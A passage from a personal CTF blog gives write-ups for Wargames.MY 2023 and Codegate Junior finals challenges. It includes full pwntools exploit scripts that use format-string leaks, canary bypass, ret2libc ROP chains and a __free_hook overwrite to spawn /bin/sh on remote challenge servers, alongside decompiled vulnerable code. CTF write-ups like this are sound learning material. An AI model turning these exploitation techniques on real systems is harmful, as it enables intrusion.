0x00007ffff7dbcd90 → mov edi, eax gef➤ canary [+] The canary of process 22462 is at 0x7ffff7d90768, value is 0x4b9505916e213c00 It seems like we can leak both the canary, and the libc using the format string vuln.\nDoing some simple counting, we find out that %13$p can be used to leak the canary, and %15$p can be used to leak a libc address, which we can use to calculate the libc base, and later on calculate the address of system@libc and the \u0026quot;/bin/sh\u0026quot; string in libc.\nI assumed that the libc used would be the same as the previous challenge, and it was indeed the same.\nSince we know the canary, we can easily bypass the canary check.\nAnd since we know the libc base address, we can just do a ret2libc with the buffer overflow.\nexploit.py from pwn import * #io = process(\u0026#34;pakmat_burger\u0026#34;,aslr=False) io = remote(\u0026#34;13.229.222.125\u0026#34;,32874) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) #secret = b\u0026#34;1337\u0026#34; secret = b\u0026#34;e31c8306\u0026#34; io.sendlineafter(b\u0026#34;Please enter your name:\u0026#34;,b\u0026#34;%15$p%13$p\u0026#34;) io.recvuntil(b\u0026#34;Hi \u0026#34;) libc.address = int(io.recv(14).decode(),16) - 128 - 171280 log.info(\u0026#34;LIBC BASE: \u0026#34; + hex(libc.address)) canary = int(io.recv(18).decode(),16) log.info(\u0026#34;CANARY: \u0026#34; + hex(canary)) #gdb.attach(io,gdbscript=\u0026#34;break *0x5555555554fe\u0026#34;) io.sendlineafter(b\u0026#34;enter the secret message:\u0026#34;,secret) io.sendlineafter(b\u0026#34;order?\u0026#34;,b\u0026#34;abcd\u0026#34;) # gadgets found in libc popRdi = p64(libc.address + 0x2a3e5) ret = p64(libc.address + 0x2a3e6) rop = b\u0026#34;A\u0026#34;* 37 + p64(canary) + b\u0026#34;A\u0026#34;*8 rop += ret + popRdi + p64(next(libc.search(b\u0026#34;/bin/sh\u0026#34;))) + p64(libc.symbols[\u0026#34;system\u0026#34;]) io.sendlineafter(b\u0026#34;soon:\u0026#34;,rop) io.interactive() Free Juice (pwn) checksec:\n[*] \u0026#39;/home/vagrant/ctf/wgmy23/free_juice/free_juice\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled src.c undefined8 main(void){ int local_c; initialize(); do { displayMenu(); printf(\u0026#34;Enter your choice: \u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;,\u0026amp;local_c); if (local_c == 3) { drinkJuices(); } else { if (local_c \u0026lt; 4) { if (local_c == 1) { chooseJuices(); } else { if (local_c == 2) { refillJuices(); } else { LAB_00100fff: puts(\u0026#34;Invalid choice. Please try again.\u0026#34;); } } } else { if (local_c == 4) { puts(\u0026#34;Exiting...\u0026#34;); } else { if (local_c != 0x539) goto LAB_00100fff; secretJuice(); } } } if (local_c == 4) { return 0; } } while( true ); } void chooseJuices(void){ int local_c; displayAvailableJuices(); printf(\u0026#34;Enter the number of the chosen juice (1-5): \u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;,\u0026amp;local_c); if ((local_c \u0026lt; 1) || (5 \u0026lt; local_c)) { puts(\u0026#34;Invalid selection. Please try again.\u0026#34;); } else { chosenJuice = malloc(0x114); if (chosenJuice == (char *)0x0) { perror(\u0026#34;Error allocating memory\u0026#34;); exit(1); } strcpy(chosenJuice,availableJuices + (long)(local_c + -1) * 0x114); *(chosenJuice + 0x100) = *(\u0026amp;DAT_00302120 + (long)(local_c + -1) * 0x114); strcpy(chosenJuice + 0x104,s_Orange_00302124 + (long)(local_c + -1) * 0x114); printf(\u0026#34;You chose %s juice.\\n\u0026#34;,chosenJuice); } return; } void displayAvailableJuices(void){ int local_c; puts(\u0026#34;Available Juices:\u0026#34;); local_c = 0; while (local_c \u0026lt; 5) { printf(\u0026#34;%d. %s\\n\u0026#34;,(ulong)(local_c + 1),availableJuices + (long)local_c * 0x114); local_c = local_c + 1; } return; } void refillJuices(void){ if (chosenJuice == 0) { puts(\u0026#34;Please choose a juice first.\u0026#34;); } else { printf(\u0026#34;Enter the quantity to refill: \u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;,chosenJuice + 0x100); puts(\u0026#34;Juice refilled!\u0026#34;); } return; } void drinkJuices(void){ if (chosenJuice == (void *)0x0) { puts(\u0026#34;Please choose a juice first.\u0026#34;); } else { puts(\u0026#34;Enjoy the refreshing experience of your chosen juice. Cheers! \u0026#34;); putchar(10); free(chosenJuice); chosenJuice = (void *)0x0; } return; } void secretJuice(void){ // option 1337 long in_FS_OFFSET; char local_118 [264]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); if (chosenJuice == (char *)0x0) { puts(\u0026#34;Please choose a juice first.\u0026#34;); } else { puts(\u0026#34;Let us know what juices you need and we will get back to you!\u0026#34;); __isoc99_scanf(\u0026#34;%256s\u0026#34;,local_118); printf(\u0026#34;Current Juice : \u0026#34;); printf(local_118); strncpy(chosenJuice,local_118,0xff); chosenJuice[0xff] = \u0026#39;\\0\u0026#39;; putchar(10); } if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { __stack_chk_fail(); } return; } libc-2.23.so is given for this chall\nThis looks like a classic heap pwn challange.\nYou can essentially 1. allocate 0x120 chunks 2. free the chunk above wilderness 3. overflow the chunk above wilderness, and leak stuff using option 1337 The only tricky part of this challenge is that you can\u0026rsquo;t free whichever chunk you want, you can only free the chunk above wilderness, which makes us essentially not be able to put any chunk into the bins, since the chunk will consolidate with the wilderness when it is freed.\nThese conditions and the libc version made me think of House of Orange. Also, the challenge context, specifically \u0026ldquo;Orange juice\u0026rdquo;, confirmed my assumption that the intended solution requires a House of Orange attack.\nWe also have all the requirements needed to perform a House of Orange attack.\n1. we have a heap overflow that can overwrite the top chunk 2. we have a libc and heap infoleak using the format string vuln As I was thinking of how to execute this attack on this challenge, it suddenly came to me, that I can actually just pwn this binary by solely using the format string vuln. I mean think about it, we can use option 1337 as many times as we want, meaning that we can use the format string vuln as many times as we want, meaning we have unlimited arbitary overwrites.\nfor a short minute I thought this exploit wouldn\u0026rsquo;t work since it reads in strings and I can\u0026rsquo;t write the packed 64 bit address as it contains null bytes, but then I realised you could just put the address at the end of the format string payload. lol\nWhat I did in the end was just leaking libc, and then overwriting __free_hook with system@libc, and writing \u0026quot;/bin/sh\u0026quot; into my juice, and freeing it.\nexploit.py from pwn import * #io = process(\u0026#34;./free_juice\u0026#34;) io = remote(\u0026#34;13.229.222.125\u0026#34;,33156) libc = ELF(\u0026#34;./libc-2.23.so\u0026#34;) def chooseJuice(): io.sendlineafter(b\u0026#34;Enter your choice:\u0026#34;,b\u0026#34;1\u0026#34;) io.sendlineafter(b\u0026#34;(1-5):\u0026#34;,b\u0026#34;1\u0026#34;) def secretJuice(a): io.sendlineafter(b\u0026#34;Enter your choice:\u0026#34;,b\u0026#34;1337\u0026#34;) io.sendlineafter(b\u0026#34;you!\u0026#34;,a) def drinkJuice(): io.sendlineafter(b\u0026#34;Enter your choice:\u0026#34;,b\u0026#34;3\u0026#34;) chooseJuice() # leak libc secretJuice(b\u0026#34;%13$p\u0026#34;) io.recvuntil(b\u0026#34;: \u0026#34;) libc.address = int(io.recv(14).decode(),16) - 271 - libc.symbols[\u0026#34;__isoc99_scanf\u0026#34;] log.info(\u0026#34;LIBC BASE: \u0026#34; + hex(libc.address)) # cheese the chall # overwrite __free_hook with system system = p64(libc.symbols[\u0026#34;system\u0026#34;])[:-2] freehook = libc.symbols[\u0026#34;__free_hook\u0026#34;] log.info(\u0026#34;system@libc: \u0026#34; + hex(libc.symbols[\u0026#34;system\u0026#34;])) log.info(\u0026#34;__free_hook: \u0026#34; + hex(libc.symbols[\u0026#34;__free_hook\u0026#34;])) for i in system: formatstr = b\u0026#34;%\u0026#34; + str(i).rjust(3,\u0026#34;0\u0026#34;).encode() + b\u0026#34;c\u0026#34; formatstr += b\u0026#34;%8$hhn\u0026#34; formatstr = formatstr.ljust(16,b\u0026#34;A\u0026#34;) formatstr += p64(freehook)[:-2] secretJuice(formatstr) freehook += 1 secretJuice(b\u0026#34;/bin/sh;\u0026#34;) drinkJuice() io.interactive() Alternative solutions I\u0026rsquo;m pretty sure that the intended solution for this chall is to use a House of Orange attack, so I think I kinda cheesed it lol. But granted that the heap overflow primitive is so strong, and we can leak everything we want, I think the execution of the attack should be quite straighforward, and can be done by just following the how2heap House of Orange writeup.\nthe only part you have to change from the how2heap writeup is prob just the part where it calculates the new wilderness size.\nOther ways that I think this chall could be solved:\nAbusing exit handlers (more on this on my previous blog post, and this article) Overwriting the jump table ptr in stdin/stdout/stderr. (I\u0026rsquo;m pretty sure this will work since the mitigation that checks the address of the vtable before virtual functions are called is added in gilbc 2.24) Copying the exploit strategy of House of Orange, and forge a fake _IO_FILE struct, place it in _IO_list_all using format string vuln, and cause malloc_printerr to run Linux Memory Usage (ppc) The problem simplified was essentially (worded by myself):\nYou are given N processes, and you are given its 1. pid 2. ppid 3. memory used For each query, you have to give the total memory used by the process, which is its own memory used plus all the memory used by its children My approach is quite straightforward.\nI made a Process class in cpp, which had the properties pid,ppid,mem, and children, which is a vector. I also made a hashmap to store all the Process objects.\nThe Process class also has a recursive method called Process.memUsed(), which adds up its own mem used with all the mem its children used. To find the mem used by its children, child.memUsed() is called (which is why I say the method is recursive)\nHowever, this solution isn\u0026rsquo;t fast enough, and will exceed the limit.\nSo to solve this, I made a new property in the Process class called totalmem, and store the value calculated by Process.memUsed() in it. This way if memUsed() is called upon the same Process object multiple times, the method won\u0026rsquo;t have to repeatedly find out the total memory, and can just use the value stored in totalmem.\nsolve.cpp #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; class Process { public: int pid; int ppid; int mem; int totalmem = 0; vector\u0026lt;Process*\u0026gt; children; Process(){ pid = 0; ppid = 0; mem = 0; } Process(int a, int b, int c){ pid = a; ppid = b; mem = c; } int memUsed(){ if (totalmem != 0){ // this has alr been calculated return totalmem; } int total = mem; for (Process* child : children){ total += child-\u0026gt;memUsed(); } totalmem = total; return total; } }; int main(){ int n,q; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; q; int a,b,c; unordered_map \u0026lt;int,Process*\u0026gt; hashmap; for (int i = 0; i \u0026lt; n; i++) { cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b \u0026gt;\u0026gt; c; Process *current = new Process(a,b,c); hashmap.insert({a,current}); if (b != 0) hashmap[b]-\u0026gt;children.push_back(current); } int pid; for (int i = 0; i \u0026lt; q; i++){ cin \u0026gt;\u0026gt; pid; cout \u0026lt;\u0026lt; hashmap[pid]-\u0026gt;memUsed() \u0026lt;\u0026lt; endl; } return 0; } Conclusion Overall, I think its not a bad ctf for ctf beginners (for pwn at least) since the challs aren\u0026rsquo;t too easy and aren\u0026rsquo;t rly that hard, so beginners will actually feel challenged when solving them, but will be able to solve them and learn a lot along the way if they do enough research and well, spend enough time on them. And even if they don\u0026rsquo;t solve them, a lot is still learned in the end, which at the end of the day, is still a huge W.\nThe organisers said that they tried to up the difficulty of the challenges this year compared to last year so that Malaysia students can improve and can compete in the international level and tbh I think that\u0026rsquo;s great! Respect to the organisers for trying to build up the Malaysian ctf scene and I wish nothing but the best for them. Hope that I can do the same and help build the Malaysian ctf community in some way in the future as well.\nHope that there are more pwn challs next year tho since there were like 8 web challs and only 3 pwn challs. I couldn\u0026rsquo;t rly do anything else after blooding the pwn challs and solving the ppc chall since I\u0026rsquo;m too noob at crypto and rev, and I hate dislike doing web (ig this is a personal skill issue). But all in all, gg!\n","permalink":"https://zhirenliew.github.io/posts/wgmy23/","summary":"writeups for wargames.my 2023 pwn (and 1 ppc) challs","title":"Wargames.MY 2023"},{"content":" Overview Last week, I traveled to Seoul, Korea to compete in this year\u0026rsquo;s codegate junior finals, and I finished at 8th out of 20 finalists.\nI managed to solve 2 pwns and 1 crypto chall, and this blog post will contain the writeups for all three of them. All attachments can be found here.\nBackstory you can skip this part and go straight to the writeups if you\u0026rsquo;d like to\nThe top 20 players from the codegate junior qualifiers were invited to the finals. I performed very badly in the qualifiers, and if I remember correctly I actually was 27th right before the ctf ended. I was pretty dissapointed in myself after the ctf cause I specifically told myself to dive into kernel pwn and windows rev before the qualifiers, but I kept being lazy and in the end I didn\u0026rsquo;t really try them out. And guess what, there was an easy kernel pwn chall and easy windows reversing chall in the qualifiers, which would guarantee me a spot in the finals had I solved any one of them, and I ended up solving none of them simply because I had no experience in any of them.\nBy the end of the ctf, I finished at 25th (not because I gained any more points, but because of the whole Hall of Shame thing), and the top 25 players were supposed to send them a writeup. I was pretty devastated at this point but I figured I just quickly write the writeup and send it to them for maybe a slight chance of me being able to go to the finals. I wanted to keep the hope alive.\nAnd to my suprise, I got an email from codegate at the end of June asking if I wanted to go to the finals. I was ecstatic and couldn\u0026rsquo;t believe that I actually got this opportunity. I told myself that this was a chance to redeem myself, and to not make the same mistakes I made before. I aimed for top 3, and practiced and learned as much as I could before the finals.\nIn the end, I got 8th, which is not bad and definitely an improvement, but still I kinda feel like I could\u0026rsquo;ve done a bit better. I was actually 3rd at the last few hours of the ctf, but I guess I didn\u0026rsquo;t push myself hard enough near the end and was a bit too complacent cause I didn\u0026rsquo;t solve anything else afterwards. Had I started working on the misc chall I was working on a bit earlier, maybe I could\u0026rsquo;ve solved it and gotten like top 4. Nevertheless, this was still an incredible experience, and Im very grateful for having this opportunity.\nEnough waffling, time to actually get to the writeups.\nezRSA (crypto) ezRsa.py #!/usr/bin/python3 import os import gmpy2 import random import sys import pathlib from Crypto.PublicKey import RSA def welcome(): text = \u0026#39;\u0026#39;\u0026#39; ,, ,, .M\u0026#34;\u0026#34;\u0026#34;bgd db `7MM `7MM\u0026#34;\u0026#34;\u0026#34;Mq. .M\u0026#34;\u0026#34;\u0026#34;bgd db ,MI \u0026#34;Y MM MM `MM. ,MI \u0026#34;Y ;MM: `MMb. `7MM `7MMpMMMb.pMMMb. `7MMpdMAo. MM .gP\u0026#34;Ya MM ,M9 `MMb. ,V^MM. `YMMNq. MM MM MM MM MM `Wb MM ,M\u0026#39; Yb MMmmdM9 `YMMNq. ,M `MM . `MM MM MM MM MM MM M8 MM 8M\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34; MM YM. . `MM AbmmmqMA Mb dM MM MM MM MM MM ,AP MM YM. , MM `Mb. Mb dM A\u0026#39; VML P\u0026#34;Ybmmd\u0026#34; .JMML..JMML JMML JMML. MMbmmd\u0026#39;.JMML.`Mbmmd\u0026#39; .JMML. .JMM.P\u0026#34;Ybmmd\u0026#34; .AMA. .AMMA. MM .JMML. \u0026#39;\u0026#39;\u0026#39; print(text) rsa_key = RSA.generate(1024) return rsa_key def get_int_length(num:int): import math return int(math.ceil(num.bit_length() / 8)) def RSAencrypt(plaintext:bytes, e:int, N:int): int_plaintext = int.from_bytes(plaintext, \u0026#39;big\u0026#39;) ciphertext = pow(int_plaintext, e, N) return ciphertext.to_bytes(get_int_length(ciphertext),\u0026#39;big\u0026#39;).hex() def RSAdecrypt(ciphertext:bytes, d:int, N:int): int_ciphertext = int.from_bytes(ciphertext, \u0026#39;big\u0026#39;) message = pow(int_ciphertext, d, N) return message.to_bytes(get_int_length(message), \u0026#39;big\u0026#39;) def action_seeflag(key): flagfile = pathlib.Path(\u0026#34;/home/ctf/flag\u0026#34;) with open (flagfile, \u0026#39;r\u0026#39;) as f: flag = f.read() data = flag.encode().hex().encode() result = RSAencrypt(data, key.e, key.n) print(f\u0026#34;FLAG is {result}\u0026#34;) return def action_encrypt(key:RSA.RsaKey): user_inp = input(\u0026#34;write plain text(hex string format): \u0026#34;) userInput_hex = bytes.fromhex(user_inp) result = RSAencrypt(userInput_hex, key.e, key.n) print(f\u0026#34;[*] Done! Here is!\\n {result}\u0026#34;) return def action_decrypt(key): ciphertext = input(\u0026#34;write ciphertext with hex string format: \u0026#34;) flagfile = pathlib.Path(\u0026#34;/home/ctf/flag\u0026#34;) with open (flagfile, \u0026#39;r\u0026#39;) as f: cmp_flag = f.read() data = cmp_flag.encode().hex().encode() userInput_hex = bytes.fromhex(ciphertext) decrypted_data = RSAdecrypt(userInput_hex, key.d, key.n) if(RSAencrypt(data, key.e, key.n) == ciphertext): print(\u0026#34;Don\u0026#39;t decrypt encrpted flag...\u0026#34;) return print(f\u0026#34;[*] decrypt result =\u0026gt; {decrypted_data.hex()}\u0026#34;) def main(rsakey): action = int(input(\u0026#34;1. encrypt\\n2. decrypt\\n3. see top secret\\n4. exit\\n\u0026gt; \u0026#34;)) if action == 1: action_encrypt(rsakey) elif action == 2: action_decrypt(rsakey) elif action == 3: action_seeflag(rsakey) elif action == 4: print(\u0026#34;byebye!\u0026#34;) sys.exit() else: print(\u0026#34;Invalid input!!\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: initkey = welcome() for _ in range(100000): print(\u0026#34;\\nYou can encrypt / decrypt with my SIMPLE RSA!\u0026#34;) try: main(initkey) except Exception as e: print(e) You can see the encrypted flag, and can encrypt and decrypt any message except for the encrypted flag. A quick google search showed me this writeup.\nSince RSA is malleable, we could produce a ciphertext in a way such that the decrypted plaintext is related to the flag.\nFrom the writeup:\nct_flag = encrypt(flag) = flag^e mod n ct_two = encrypt(2) = 2^e mod n ct_not_flag = ct_flag*ct_two = (flag*2)^e mod n decrypted(ct_not_flag) = flag*2 calc (pwn) checksec:\nArch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled note():\nvoid note(void) { ssize_t sVar1; char buf [44]; int local_c; memset(buf,0,0x20); printf(\u0026#34;Note\u0026gt; \u0026#34;); sVar1 = read(0,buf,0x100); local_c = (int)sVar1; if (buf[local_c + -1] == \u0026#39;\\n\u0026#39;) { buf[local_c + -1] = \u0026#39;\\0\u0026#39;; } memcpy(notepad,buf,(long)local_c); printf(\u0026#34;Notepad: %s\\n\u0026#34;,notepad); return; } There is an obvious buffer overflow here. With stack canaries off, we just need a leak of either PIE or libc to just ROP and get shell.\ncalc() void calc(void) { size_t sVar1; undefined8 uVar2; memset(expression,0,0x100); printf(\u0026#34;Formula\u0026gt; \u0026#34;); fgets(expression,0x100,stdin); sVar1 = strlen(expression); if (notepad[sVar1 + 0xff] == \u0026#39;\\n\u0026#39;) { sVar1 = strlen(expression); notepad[sVar1 + 0xff] = 0; } uVar2 = evaluateExpression(); printf(\u0026#34;Result\u0026gt; %ld\\n\u0026#34;,uVar2); return; } long evaluateExpression(void) { // ghidra showed more vars here but I deleted them to make it cleaner here long local_988 [256]; char local_188 [264]; memset(local_188,0,0x100); memset(local_988,0,0x800); operatorTop = -1; operandTop = -1; i = 0; do { uVar6 = SEXT48(i); sVar4 = strlen(expression); if (sVar4 \u0026lt;= uVar6) { while (-1 \u0026lt; operatorTop) { lVar5 = (long)operatorTop; local_21 = local_188[lVar5]; iVar1 = operandTop + -1; local_30 = local_988[operandTop]; operandTop = operandTop + -2; local_38 = local_988[iVar1]; operatorTop = operatorTop + -1; local_40 = calculate(local_38,local_30,(int)local_188[lVar5],local_30); operandTop = operandTop + 1; local_988[operandTop] = local_40; } return local_988[operandTop]; } local_41 = expression[i]; ppuVar3 = __ctype_b_loc(); if (((*ppuVar3)[local_41] \u0026amp; 0x800) == 0) { if (local_41 == \u0026#39;(\u0026#39;) { operatorTop = operatorTop + 1; local_188[operatorTop] = \u0026#39;(\u0026#39;; } else { if (local_41 == \u0026#39;)\u0026#39;) { while ((-1 \u0026lt; operatorTop \u0026amp;\u0026amp; (local_188[operatorTop] != \u0026#39;(\u0026#39;))) { lVar5 = (long)operatorTop; local_61 = local_188[lVar5]; iVar1 = operandTop + -1; local_70 = local_988[operandTop]; operandTop = operandTop + -2; local_78 = local_988[iVar1]; operatorTop = operatorTop + -1; local_80 = calculate(local_78,local_70,(int)local_188[lVar5],local_70); operandTop = operandTop + 1; local_988[operandTop] = local_80; } if ((-1 \u0026lt; operatorTop) \u0026amp;\u0026amp; (local_188[operatorTop] == \u0026#39;(\u0026#39;)) { operatorTop = operatorTop + -1; } } else { if ((((local_41 == \u0026#39;+\u0026#39;) || (local_41 == \u0026#39;-\u0026#39;)) || (local_41 == \u0026#39;*\u0026#39;)) || ((local_41 == \u0026#39;/\u0026#39; || (local_41 == \u0026#39;^\u0026#39;)))) { while (-1 \u0026lt; operatorTop) { iVar1 = getPriority((int)local_188[operatorTop]); iVar2 = getPriority((int)local_41); if (iVar1 \u0026lt; iVar2) break; lVar5 = (long)operatorTop; local_42 = local_188[lVar5]; iVar1 = operandTop + -1; local_50 = local_988[operandTop]; operandTop = operandTop + -2; local_58 = local_988[iVar1]; operatorTop = operatorTop + -1; local_60 = calculate(local_58,local_50,(int)local_188[lVar5],local_50); operandTop = operandTop + 1; local_988[operandTop] = local_60; } operatorTop = operatorTop + 1; local_188[operatorTop] = local_41; } } } } else { local_20 = 0; while ((uVar6 = SEXT48(i), sVar4 = strlen(expression), uVar6 \u0026lt; sVar4 \u0026amp;\u0026amp; (ppuVar3 = __ctype_b_loc(), ((*ppuVar3)[(char)expression[i]] \u0026amp; 0x800) != 0))) { local_20 = (long)((char)expression[i] + -0x30) + local_20 * 10; i = i + 1; } operandTop = operandTop + 1; local_988[operandTop] = local_20; i = i + -1; } i = i + 1; } while( true ); } I actually didn\u0026rsquo;t fully reverse the evaluateExpression function as it was dense. I saw that it called __ctype_b_loc(), and assumed that it checked if the char in the expression was a digit or a symbol. I went to test this out by typing A-1 in the calculator, and a large number was outputted. I turned the number to hex and it was a PIE leak.\nGlad I didn\u0026rsquo;t have to reverse the evaluateExpression function :))\nI then tried to find a pop rdi; ret gadget in the binary to pop a GOT address into rdi and then just ret to puts@plt to leak libc, but no such gadget was found. I then breakpointed at the ret instruction inside note() to see what the registers are like when we control ret, and\n[ Legend: Modified register | Code | Heap | Stack | String ] ──────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ──── $rax : 0x37 $rbx : 0x0 $rcx : 0x00007ffff7ea7a37 → 0x5177fffff0003d48 (\u0026#34;H=\u0026#34;?) $rdx : 0x0 $rsp : 0x00007fffffffe2d8 → \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]\u0026#34; $rbp : 0x4141414141414141 (\u0026#34;AAAAAAAA\u0026#34;?) $rsi : 0x00007fffffffc180 → \u0026#34;Notepad: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]\u0026#34; $rdi : 0x00007fffffffc060 → 0x00007ffff7df50d0 → \u0026lt;funlockfile+0\u0026gt; endbr64 $rip : 0x0000555555555ac9 → \u0026lt;note+174\u0026gt; ret $r8 : 0x37 $r9 : 0x7fffffff $r10 : 0x0 $r11 : 0x246 $r12 : 0x00007fffffffe408 → 0x00007fffffffe66e → \u0026#34;/home/vagrant/ctf/finals_codegate23/calculator/cal[...]\u0026#34; $r13 : 0x0000555555555b58 → \u0026lt;main+0\u0026gt; endbr64 $r14 : 0x0000555555557d78 → 0x0000555555555220 → \u0026lt;__do_global_dtors_aux+0\u0026gt; endbr64 $r15 : 0x00007ffff7ffd040 → 0x00007ffff7ffe2e0 → 0x0000555555554000 → jg 0x555555554047 $eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification] $cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 rdi is already pointing to a libc address.\nSo I just ret to puts@plt to leak libc, and then ret back to _start (entry point) to restart the program, and then just ret2libc.\nexploit.py from pwn import * #io = process(\u0026#34;./calc\u0026#34;) io = remote(\u0026#34;13.125.200.127\u0026#34;,8888) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) io.sendlineafter(\u0026#34;command\u0026gt;\u0026#34;,\u0026#34;calc\u0026#34;) io.sendlineafter(\u0026#34;Formula\u0026gt;\u0026#34;,\u0026#34;A\u0026#34;) io.recvuntil(\u0026#34;Result\u0026gt; \u0026#34;) pieBase = int(io.recvline()[:-1]) - 5951 log.info(\u0026#34;PIE BASE: \u0026#34; + hex(pieBase)) putsPlt = p64(pieBase + 0x10e0) entry = p64(pieBase + 0x1180) rop = b\u0026#34;A\u0026#34; * 56 + putsPlt + entry io.sendlineafter(\u0026#34;command\u0026gt;\u0026#34;,\u0026#34;note\u0026#34;) io.sendlineafter(\u0026#34;Note\u0026gt;\u0026#34;,rop) io.recvline() libc.address = u64(io.recv(6).ljust(8,b\u0026#34;\\x00\u0026#34;)) - libc.symbols[\u0026#34;funlockfile\u0026#34;] log.info(\u0026#34;LIBC BASE: \u0026#34; + hex(libc.address)) popRdi = p64(libc.address + 0x2a3e5) ret = p64(pieBase + 0x1be9) rop2 = b\u0026#34;A\u0026#34;*56 + ret + popRdi + p64(next(libc.search(b\u0026#34;/bin/sh\u0026#34;))) + p64(libc.symbols[\u0026#34;system\u0026#34;]) io.sendlineafter(\u0026#34;command\u0026gt;\u0026#34;,\u0026#34;note\u0026#34;) io.sendlineafter(\u0026#34;Note\u0026gt;\u0026#34;,rop2) io.interactive() I actually managed to get first blood for this chall, and for the whole pwn category, which is my first ever first blood 🩸!\ngoblin_vm (pwn) checksec:\nArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled src.c undefined8 main(void){ bool bVar1; undefined isLargeRoom; char *untilSpaceStr; long in_FS_OFFSET; undefined4 local_828; int instr; undefined4 *mallocChunk; char code [2056]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); setup(); isLargeRoom = askRoom(); room = giveRoom(isLargeRoom); bVar1 = false; local_828 = 1; mallocChunk = (undefined4 *)malloc(4); *mallocChunk = 1; do { memset(code,0,0x800); getInput(code); untilSpaceStr = strtok(code,\u0026#34; \u0026#34;); instr = atoi(untilSpaceStr); switch(instr) { case 1: instr1(); break; case 2: instr2(); break; case 3: instr3(); break; case 4: instr4(); break; case 5: instr5(); break; case 6: instr6(); break; case 7: instr7(); break; case 8: instr8(); break; case 9: instr9(); break; case 10: instr10(mallocChunk,\u0026amp;local_828,\u0026amp;local_828); break; case 0xb: bVar1 = true; } } while (!bVar1); if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { __stack_chk_fail(); } return 0; } undefined8 askRoom(void){ ssize_t sVar1; undefined8 uVar2; long in_FS_OFFSET; char local_118 [264]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); puts(\u0026#34;Hi, Do you want a large room? [y/N]\u0026#34;); sVar1 = read(0,local_118,10); if (sVar1 == -1) { exit(-1); } if ((local_118[0] == \u0026#39;y\u0026#39;) || (local_118[0] == \u0026#39;Y\u0026#39;)) { uVar2 = 1; } else { uVar2 = 0; } if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { __stack_chk_fail(); } return uVar2; } long giveRoom(char param_1){ void *pvVar1; size_t local_18; if (param_1 == \u0026#39;\\0\u0026#39;) { local_18 = 0x100000; } else { local_18 = 0x400000; } pvVar1 = calloc(local_18,1); return (long)pvVar1 + (local_18 \u0026gt;\u0026gt; 1); } The binary is an implementation of the classic stack machine.\nIt first asks if you would want a large room (room here is refering to the vm\u0026rsquo;s stack/memory), and will calloc(0x400000) if you answer \u0026lsquo;Y\u0026rsquo;, and calloc(0x100000) if you answer anything else. Since the malloc request sizes are so large, the chunk is actually not allocated at the heap, but instead fulfilled using mmap(), having the memory map being allocated right above libc. This means that the room/vm\u0026rsquo;s stack is right above libc.\nIt then asks for instructions in a while loop, expecting input in the form of: opcode arg.\nSo for example: 1 9\nLet\u0026rsquo;s look at what the instructions actually do:\nvoid instr1(void){ // push reg onto stack room = (room - 8); *room = reg; return; } void instr2(void){ // pop value on top of stack into reg reg = *room; // qword room = room + 1; // ptr addition, so actually + 8 return; } void instr3(void){ // reg++ reg = reg + 1; // actually add 1 return; } void instr4(void){ // reg-- reg = reg - 1; return; } void instr5(void){ // 5 123 // reg += 123 __nptr = strtok(0x0,\u0026#34; \u0026#34;); lVar1 = atoll(__nptr); reg = reg + lVar1; return; } void instr6(void){ // 6 123 // reg -= 123 __nptr = strtok((char *)0x0,\u0026#34; \u0026#34;); lVar1 = atoll(__nptr); reg = reg - lVar1; return; } void instr7(void){ // 7 123 // reg = 123 char *__nptr; __nptr = strtok((char *)0x0,\u0026#34; \u0026#34;); reg = atoll(__nptr); return; } void instr8(void){ // 8 123 // room += 123 __nptr = strtok((char *)0x0,\u0026#34; \u0026#34;); lVar1 = atoll(__nptr); room = lVar1 + room; return; } void instr9(void){ // 9 123 // room -= 123 __nptr = strtok((char *)0x0,\u0026#34; \u0026#34;); lVar1 = atoll(__nptr); room = room - lVar1; return; } void instr10(int *param_1,int *param_2){ // a leak // a global variable, a stack variable, and a heap variable is set to 1 if (((DAT_00104010 == 1) \u0026amp;\u0026amp; (*param_1 == 1)) \u0026amp;\u0026amp; (*param_2 == 1)) { printf(\u0026#34;rax: %ld\\n\u0026#34;,reg); DAT_00104010 = 0; *param_1 = 0; *param_2 = 0; } return; } So room is essentially $rsp, and reg is essentially $rax.\nThere are simple push and pop instructions, and instructions to manipulate both the registers. There\u0026rsquo;s also an instruction to print out the value of reg, but it can only be called once. There\u0026rsquo;s 3 booleans, 1 in the .data segment, 1 in the stack, and 1 in the heap, that all become true when the print instruction is called.\nThe obvious vulnerability here is that there are completely no bounds check on where you can move room. And since room is right above libc, you can easily move room into libc and leak an address, and overwrite libc structures stored in libc memory. You wouldn\u0026rsquo;t need any leaks to do that since room is relative to libc_base, and other libc addresses, meaning that everytime the binary is ran, the offset between room and let\u0026rsquo;s say main_arena is the same. (Assuming you choose the same room size,big/small, everytime.)\nExploitation ideas You could of course try to overwrite the ret pointer of main and just try to ret2libc, but for that to work you have to move room-\u0026gt;stack, and in order to do that you have to know\nwhere room is where the stack is However, you only have one leak.\nTechnically, you could try to overwrite the global boolean, the stack boolean, and maybe overwrite the heap chunk pointer on the stack so that it points to other memory in order to 